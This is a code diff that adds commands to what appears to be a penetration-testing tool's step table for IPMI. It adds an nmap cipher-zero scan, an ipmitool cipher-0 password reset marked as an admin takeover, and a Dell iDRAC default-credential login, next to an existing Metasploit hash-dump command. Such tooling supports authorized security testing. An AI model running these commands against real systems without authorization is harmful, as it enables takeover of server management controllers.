@@ -4896,6 +4896,7 @@ _STEP_COMMANDS = {
     },
     "ipmi": {
         1: [
+            "nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero <RHOST>",
             "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <RHOST>; run'",
         ],
         2: [
@@ -4903,9 +4904,11 @@ _STEP_COMMANDS = {
         ],
         3: [
             "ipmitool -I lanplus -C 0 -H <RHOST> -U root -P '' user list",
+            "ipmitool -I lanplus -C 0 -H <RHOST> -U root -P '' user set password 2 <NEWPASS>   # cipher-0 admin takeover",
         ],
         4: [
             "ipmitool -I lanplus -H <RHOST> -U ADMIN -P ADMIN chassis status",
+            "ipmitool -I lanplus -H <RHOST> -U root -P calvin chassis status   # Dell iDRAC default",
         ],
         5: [
             "# HackTricks IPMI: https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi",
